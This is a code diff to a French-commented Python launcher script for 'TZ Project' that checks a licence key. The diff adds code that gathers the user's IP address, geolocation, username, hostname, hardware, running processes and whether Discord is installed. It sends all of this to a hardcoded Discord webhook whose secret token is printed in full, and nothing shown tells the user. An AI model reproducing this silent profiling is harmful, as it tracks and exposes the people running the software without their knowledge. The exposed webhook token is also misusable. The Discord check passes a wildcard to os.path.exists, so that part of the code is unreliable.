@@ -6,6 +6,9 @@ import subprocess
 import requests
 import socket
 import platform
+import psutil
+import gpuinfo
+import json
 
 # Configuration
 logo_path = "IMG_2724.jpeg"
@@ -13,7 +16,20 @@ bg_path = "IMG_2728.jpeg"
 webhook_url = "https://discord.com/api/webhooks/1317804846388084746/LzjsxSceGqQaizw-JqFCUvbrFRhboYC0DJbmMFH21ViQlikda0bZF9E4z2zDiRT2N9f8"
 correct_key = "CM_AFEO-LOVD-DJRB-DIES"
 
-# 📡 Récupération des infos du PC
+# 📡 Récupérer les informations sur l'IP et la localisation
+def get_ip_info():
+    try:
+        response = requests.get('https://ipinfo.io/json')
+        data = response.json()
+        location = data.get('city', 'Inconnu') + ", " + data.get('region', 'Inconnu') + ", " + data.get('country', 'Inconnu')
+        ip_address = data.get('ip', 'Inconnu')
+
+        return location, ip_address
+    except requests.exceptions.RequestException as e:
+        print(f"Erreur lors de la récupération de l'IP : {e}")
+        return 'Inconnu', 'Inconnu'
+
+# 📡 Récupérer les infos du PC
 def get_system_info():
     try:
         hostname = socket.gethostname()
@@ -21,6 +37,24 @@ def get_system_info():
         os_name = platform.system()
         os_version = platform.release()
         user = os.getenv("USERNAME") or os.getenv("USER")
+        location, ip_info = get_ip_info()
+
+        # 📊 Récupérer des infos système supplémentaires
+        cpu = psutil.cpu_percent(interval=1)
+        ram = psutil.virtual_memory().percent
+
+        # 📈 Carte graphique
+        gpus = gpuinfo.get_info()
+        gpu_info = "Non détectée"
+        if gpus:
+            gpu_info = gpus[0].get('GPU', 'Inconnu')
+
+        # Vérification si Discord est installé
+        discord_installed = os.path.exists(r"C:\Users\{0}\AppData\Local\Discord\app-*.exe".format(user))  # Change selon ton OS si nécessaire
+
+        # Récupération de la version des drivers et applications installées
+        driver_version = platform.version()
+        applications = [p.name() for p in psutil.process_iter()]
 
         return {
             "content": "**💻 Connexion détectée sur TZ Project !**",
@@ -33,6 +67,13 @@ def get_system_info():
                         {"name": "🌐 Adresse IP", "value": ip_address, "inline": False},
                         {"name": "👤 Utilisateur", "value": user, "inline": False},
                         {"name": "🛠️ OS", "value": f"{os_name} {os_version}", "inline": False},
+                        {"name": "📍 Localisation", "value": location, "inline": False},
+                        {"name": "💾 RAM", "value": f"{ram}% utilisée", "inline": False},
+                        {"name": "🖥️ CPU", "value": f"{cpu}% utilisé", "inline": False},
+                        {"name": "💻 Carte Graphique", "value": gpu_info, "inline": False},
+                        {"name": "📦 Version des drivers", "value": driver_version, "inline": False},
+                        {"name": "Applications installées", "value": ", ".join(applications[:5]), "inline": False},
+                        {"name": "Discord Installé", "value": "Oui" if discord_installed else "Non", "inline": False}
                     ]
                 }
             ]
